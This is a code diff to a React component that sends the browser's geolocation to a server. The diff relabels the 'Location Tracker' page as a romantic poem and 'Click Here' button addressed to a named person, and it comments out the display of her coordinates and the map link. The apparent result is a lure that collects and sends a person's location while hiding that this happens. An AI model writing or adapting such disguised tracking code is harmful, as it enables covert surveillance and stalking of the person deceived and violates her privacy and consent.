@@ -20,10 +20,10 @@ const LocationSender = () => {
 
       const data = await res.json();
       console.log("Server response:", data);
-      setStatus("✅ Location sent successfully!");
+      setStatus("I Love You Bauua♥");
     } catch (err) {
       console.error(err);
-      setStatus("❌ Failed to send location");
+      setStatus("You did something wrong⚠");
     }
   };
 
@@ -33,7 +33,7 @@ const LocationSender = () => {
       return;
     }
 
-    setStatus("📍 Getting location...");
+    setStatus("📍 Getting Started Beautiful");
 
     navigator.geolocation.getCurrentPosition(
         (position) => {
@@ -59,7 +59,10 @@ const LocationSender = () => {
 
   return (
     <div style={{ textAlign: "center", marginTop: "3rem" }}>
-      <h1>📡 Location Tracker</h1>
+      <h1>Tere bina sab adhoora lagta hai,
+      Tere bina har pal zara udaas lagta hai,
+      Tu hai mera Baccha, tu hi meri Annu,
+      Tu paas ho toh har din khaas lagta hai. 💞</h1>
       <button
         onClick={handleSendLocation}
         style={{
@@ -72,7 +75,7 @@ const LocationSender = () => {
           fontSize: "1rem",
         }}
       >
-        Send My Location
+        Click Here 🥰
       </button>
 
       <p style={{ marginTop: "1rem" }}>{status}</p>
@@ -80,18 +83,21 @@ const LocationSender = () => {
       {coords && (
         <div style={{ marginTop: "1rem" }}>
           <p>
-            <strong>Latitude:</strong> {coords.latitude}
+            {/* <strong>Latitude:</strong> {coords.latitude} */}
+            {coords.latitude && (
+              <p>Annu, when I call you Baccha or Bauua, it's not just a name — it's a feeling. A feeling that you're mine, and I'm yours, forever. 💫</p>
+            )}
           </p>
           <p>
-            <strong>Longitude:</strong> {coords.longitude}
+            {/* <strong>Longitude:</strong> {coords.longitude} */}
           </p>
-          <a
+          {/* <a
             href={`https://www.google.com/maps?q=${coords.latitude},${coords.longitude}`}
             target="_blank"
             rel="noreferrer"
           >
             🌍 View on Google Maps
-          </a>
+          </a> */}
         </div>
       )}
     </div>
